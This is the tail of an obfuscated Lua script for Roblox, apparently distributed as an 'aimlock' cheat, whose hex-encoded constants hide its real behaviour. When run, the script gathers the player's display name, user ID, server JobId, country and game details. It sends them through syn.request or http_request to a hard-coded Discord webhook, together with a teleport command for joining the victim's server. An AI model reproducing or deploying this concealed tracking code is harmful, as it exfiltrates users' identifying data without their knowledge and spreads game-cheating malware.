v90[v92[2]][v92[3]]=v90[v92[4]];end elseif (v93<=43) then if (v93>42) then if ((v92[3]=="_ENV") or (v92[3]=="getfenv")) then v90[v92[2]]=v64;else v90[v92[2]]=v64[v92[3]];end else local v205=v92[2];local v206={};for v268=1, #v89 do local v269=0;local v270;while true do if (v269==0) then v270=v89[v268];for v333=0, #v270 do local v334=v270[v333];local v335=v334[1];local v336=v334[2];if ((v335==v90) and (v336>=v205)) then v206[v336]=v335[v336];v334[1]=v206;end end break;end end end end elseif (v93>44) then v90[v92[2]]=v90[v92[3]];else do return v90[v92[2]];end end elseif (v93<=53) then if (v93<=49) then if (v93<=47) then if (v93>46) then v90[v92[2]]=v63[v92[3]];else v84=v92[3];end elseif (v93>48) then v90[v92[2]]={};else local v213=v90[v92[4]];if  not v213 then v84=v84 + 1 ;else local v287=0;while true do if (v287==0) then v90[v92[2]]=v213;v84=v92[3];break;end end end end elseif (v93<=51) then if (v93>50) then v90[v92[2]]=v63[v92[3]];elseif (v90[v92[2]]==v92[4]) then v84=v84 + 1 ;else v84=v92[3];end elseif (v93>52) then v90[v92[2]]=v90[v92[3]][v92[4]];else do return;end end elseif (v93<=57) then if (v93<=55) then if (v93>54) then if v90[v92[2]] then v84=v84 + 1 ;else v84=v92[3];end else local v218=v92[2];do return v13(v90,v218,v85);end end elseif (v93>56) then v90[v92[2]]=v92[3];else v90[v92[2]][v92[3]]=v92[4];end elseif (v93<=59) then if (v93==58) then for v271=v92[2],v92[3] do v90[v271]=nil;end else v90[v92[2]][v92[3]]=v90[v92[4]];end elseif (v93>60) then v84=v92[3];else do return v90[v92[2]];end end v84=v84 + 1 ;break;end end end end;end if (v65==0) then v66=v62[1];v67=v62[2];v65=1;end end end return v30(v29(),{},v17)(...);end end end v15("LOL!5F3O00028O00026O001440031D3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F67616D65732F03083O00746F737472696E6703043O0067616D6503073O00506C616365496403043O004E616D65030B3O004465736372697074696F6E2O033O004E2F41026O00F03F03073O0043726561746F72030B3O0043726561746F7254797065030F3O0043726561746F725461726765744964027O004003043O0055736572031A3O002O2A47616D652043726561746F7220557365722049443A2O2A2003053O007063612O6C03163O004765744E616D6546726F6D5573657249644173796E63031D3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F75736572732F03093O002F70726F66696C652F031A3O002O2A47616D652043726561746F722050726F66696C653A2O2A20030C3O00556E6B6E6F776E205573657203053O0047726F7570031E3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F67726F7570732F03183O002O2A47616D652043726561746F722047726F75703A2O2A20031B3O002O2A47616D652043726561746F722047726F75702049443A2O2A2003013O002F03093O0055726C456E636F6465030B3O004C6F63616C506C61796572026O001840030A3O0047657453657276696365030C3O0047726F75705365727669636503133O004C6F63616C697A6174696F6E53657276696365026O000840030E3O0047657450726F64756374496E666F026O00104003053O007469746C65030B3O006465736372697074696F6E03043O007479706503043O007269636803053O00636F6C6F7203083O00746F6E756D626572023O00809896454103063O00662O6F74657203043O007465787403183O00646973636F72642E2O672F696F736578706C6F697465727303093O0074696D657374616D7003023O006F7303043O006461746503133O002125592D256D2D25645425483A254D3A25535A026O001C4003183O002O23202O5F534352494F54204558454355544544212O5F0A03253O002O2A5363726970743A2O2A205261696E626F772053756E7368696E652041696D6C6F636B0A030A3O002O2A557365723A2O2A2003023O002028030B3O00446973706C61794E616D6503023O00290A030D3O002O2A557365722049443A2O2A2003063O0055736572496403013O000A03103O002O2A536572766572204944203A2O2A2003053O004A6F624964030D3O002O2A436F756E7472793A2O2A2003023O002O0A030F3O002O2A47616D65204E616D653A2O2A20030D3O002O2A47616D652049443A2O2A2003163O002O2A47616D65204465736372697074696F6E3A2O2A20030E3O002O2A47616D652055524C3A2O2A2003073O002O2A47616D652003093O00204E616D653A2O2A2003073O00556E6B6E6F776E034O0003073O00506C6179657273030B3O00482O74705365727669636503123O004D61726B6574706C616365536572766963652O033O0073796E03073O0072657175657374030C3O00682O74705F7265717565737403043O00682O74702O033O0055726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132303834313035363334393631322O3435362F78305F4F6A6C4145506A496B31726636646A6F502D65427865306B4C535A3353656D5164726D52314239517467516C41793932774C775A68462D53654156494E6B48775603063O004D6574686F6403043O00504F535403073O0048656164657273030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E03043O00426F6479030A3O004A534F4E456E636F646503073O00636F6E74656E7403103O002O2D2054656C65706F72747320546F20030A3O002773205365727665720A033C3O0067616D653A47657453657276696365282254656C65706F72745365727669636522293A54656C65706F7274546F506C616365496E7374616E6365282203043O00222C2022031C3O00222C2067616D652E506C61796572732E4C6F63616C506C617965722903063O00656D626564730074012O0012393O00014O003A000100173O00260A3O00850001000200043D3O00850001001239001800033O001223001900043O001223001A00053O002035001A001A00062O00180019000200022O001600130018001900061B0009008300013O00043D3O0083000100061B000A008300013O00043D3O00830001001239001800014O003A001900193O000E0C000100100001001800043D3O00100001001239001900013O00260A001900260001000100043D3O00260001001239001A00013O00260A001A00210001000100043D3O002100012O0002001B00073O002035001C000A00072O0018001B000200022O0002000B001B3O002035001B000A0008000630000C00200001001B00043D3O00200001001239000C00093O001239001A000A3O00260A001A00160001000A00043D3O001600010012390019000A3O00043D3O0026000100043D3O0016000100260A001900350001000A00043D3O00350001001239001A00013O00260A001A00300001000100043D3O00300001002035001B000A000B002035000D001B000C002035001B000A000B002035000E001B000D001239001A000A3O00260A001A00290001000A00043D3O002900010012390019000E3O00043D3O0035000100043D3O0029000100260A001900130001000E00043D3O0013000100260A000D005A0001000F00043D3O005A0001001239001A00014O003A001B001C3O00260A001A00460001000A00043D3O00460001001239001200103O001223001D00113O002035001E000100122O0002001F00014O00020020000E4O0008001D0020001E2O0002001C001E4O0002001B001D3O001239001A000E3O00260A001A00500001000100043D3O00500001001239001D00133O001223001E00044O0002001F000E4O0018001E00020002001239001F00144O00160010001D001F001239001100153O001239001A000A3O00260A001A003B0001000E00043D3O003B000100061B001B005600013O00043D3O00560001000630000F00570001001C00043D3O00570001001239000F00163O00043D3O0075000100043D3O003B000100043D3O0075000100260A000D00750001001700043D3O00750001001239001A00014O003A001B001B3O00260A001A005E0001000100043D3O005E0001001239001B00013O00260A001B006A0001000100043D3O006A0001001239001C00183O001223001D00044O0002001E000E4O0018001D000200022O00160010001C001D001239001100193O001239001B000A3O000E0C000A00610001001B00043D3O006100010012390012001A4O0002001C00064O0002001D000E4O0018001C000200022O0002000F001C3O00043D3O0075000100043D3O0061000100043D3O0075000100043D3O005E0001001239001A00033O001223001B00043O001223001C00053O002035001C001C00062O0018001B00020002001239001C001B3O00201A001D0002001C2O0002001F000B4O0021001D001F00022O00160013001A001D00043D3O0083000100043D3O0013000100043D3O0083000100043D3O0010000100203500140001001D0012393O001E3O00260A3O009B0001000A00043D3O009B0001001239001800013O00260A001800950001000100043D3O00950001001223001900053O00201A00190019001F001239001B00204O00210019001B00022O0002000400193O001223001900053O00201A00190019001F001239001B00214O00210019001B00022O0002000500193O0012390018000A3O00260A001800880001000A00043D3O008800012O003A000600063O0012393O000E3O00043D3O009B000100043D3O0088000100260A3O00B10001002200043D3O00B10001001239001800013O00260A001800A40001000100043D3O00A400012O003A000800083O00060100083O000100012O002D3O00053O0012390018000A3O00260A0018009E0001000A00043D3O009E0001001223001900113O002035001A000300232O0002001B00033O001223001C00053O002035001C001C00062O00080019001C001A2O0002000A001A4O0002000900193O0012393O00243O00043D3O00B1000100043D3O009E000100260A3O00042O01001E00043D3O00042O01001239001800013O00260A001800C90001000A00043D3O00C900012O000400193O000600102900190025000B001029001900260016003010001900270028001223001A002A3O001239001B002B4O0018001A0002000200102900190029001A2O0004001A3O0001003010001A002D002E0010290019002C001A001223001A00303O002035001A001A0031001239001B00324O0018001A000200020010290019002F001A2O0002001700193O0012393O00333O00043D3O00042O0100260A001800B40001000100043D3O00B400012O0002001900084O0002001A00144O00180019000200022O0002001500193O001239001900343O001239001A00353O001239001B00363O002035001C00140007001239001D00373O002035001E00140038001239001F00393O0012390020003A3O001223002100043O00203500220014003B2O00180021000200020012390022003C3O0012390023003D3O001223002400053O00203500240024003E0012390025003C3O0012390026003F4O0002002700153O001239002800403O001239002900414O0002002A000B3O001239002B003C3O001239002C00423O001223002D00053O002035002D002D0006001239002E003C3O001239002F00434O00020030000C3O001239003100403O001239003200444O0002003300133O001239003400403O001239003500453O00260A000D00F50001000F00043D3O00F500010012390036000B3O00061E003600F60001000100043D3O00F60001001239003600173O001239003700464O00020038000F3O0012390039003C4O0002003A00123O001223003B00044O0002003C000E4O0018003B00020002001239003C003C4O0002003D00114O0002003E00103O001239003F003C4O001600160019003F0012390018000A3O00043D3O00B4000100260A3O001C2O01002400043D3O001C2O01001239001800013O000E0C000100122O01001800043D3O00122O01001239001900093O001239000C00094O0002000B00193O001239001900093O001239001A00093O001239000F00474O0002000E001A4O0002000D00193O0012390018000A3O00260A001800072O01000A00043D3O00072O01001239001900483O001239001A00483O001239001200484O00020011001A4O0002001000193O0012393O00023O00043D3O001C2O0100043D3O00072O0100260A3O002B2O01000E00043D3O002B2O01001239001800013O00260A001800242O01000A00043D3O00242O01000205000700013O0012393O00223O00043D3O002B2O0100260A0018001F2O01000100043D3O001F2O0100060100060002000100012O002D3O00044O003A000700073O0012390018000A3O00043D3O001F2O0100260A3O00452O01000100043D3O00452O01001239001800013O00260A0018003B2O01000100043D3O003B2O01001223001900053O00201A00190019001F001239001B00494O00210019001B00022O0002000100193O001223001900053O00201A00190019001F001239001B004A4O00210019001B00022O0002000200193O0012390018000A3O00260A0018002E2O01000A00043D3O002E2O01001223001900053O00201A00190019001F001239001B004B4O00210019001B00022O0002000300193O0012393O000A3O00043D3O00452O0100043D3O002E2O0100260A3O00020001003300043D3O000200010012230018004C3O00061B0018004E2O013O00043D3O004E2O010012230018004C3O00203500180018004D00061E001800532O01000100043D3O00532O010012230018004E3O00061E001800532O01000100043D3O00532O010012230018004F3O00203500180018004D2O000400193O00040030100019005000510030100019005200532O0004001A3O0001003010001A0055005600102900190054001A00201A001A000200582O0004001C3O0002001239001D005A3O002035001E00140007001239001F005B3O0012390020005C3O001223002100043O001223002200053O0020350022002200062O00180021000200020012390022005D3O001223002300053O00203500230023003E0012390024005E4O0016001D001D0024001029001C0059001D2O0004001D00014O0002001E00174O000F001D00010001001029001C005F001D2O0021001A001C000200102900190057001A2O002000180002000100043D3O00722O0100043D3O000200012O001D8O00343O00013O00033O00043O00028O00026O00F03F03053O007063612O6C03073O00556E6B6E6F776E01213O001239000100014O003A000200043O00260A0001001A0001000200043D3O001A00012O003A000400043O00260A000200050001000100043D3O00050001001239000500013O00260A000500080001000100043D3O00080001001223000600033O00060100073O000100022O002F8O002D8O000D0006000200072O0002000400074O0002000300063O00061B0003001500013O00043D3O00150001000630000600160001000400043D3O00160001001239000600044O002C000600023O00043D3O0008000100043D3O0005000100043D3O0020000100260A000100020001000100043D3O00020001001239000200014O003A000300033O001239000100023O00043D3O000200012O00343O00013O00013O00013O00031E3O00476574436F756E747279526567696F6E466F72506C617965724173796E6300064O00337O00201A5O00012O0033000200014O000E3O00024O00138O00343O00017O00053O0003053O006D61746368030C3O005E25732A282E2D2925732A2403043O006773756203023O00252E034O0001093O00201A00013O0001001239000300024O002100010003000200201A000100010003001239000300043O001239000400054O000E000100044O001300016O00343O00017O00083O00028O0003053O007063612O6C03113O0047657447726F7570496E666F4173796E6303043O004E616D6503043O007761726E03233O004661696C656420746F2066657463682067726F7570206E616D6520666F722049443A2003083O00746F737472696E67030D3O00556E6B6E6F776E2047726F757001213O001239000100014O003A000200033O00260A000100020001000100043D3O00020001001223000400024O003300055O0020350005000500032O003300066O000200076O00080004000700052O0002000300054O0002000200043O00061B0002001100013O00043D3O001100010020350004000300042O002C000400023O00043D3O00200001001239000400013O00260A000400120001000100043D3O00120001001223000500053O001239000600063O001223000700074O000200086O00180007000200022O00160006000600072O0020000500020001001239000500084O002C000500023O00043D3O0012000100043D3O0020000100043D3O000200012O00343O00017O00",v9(),...);
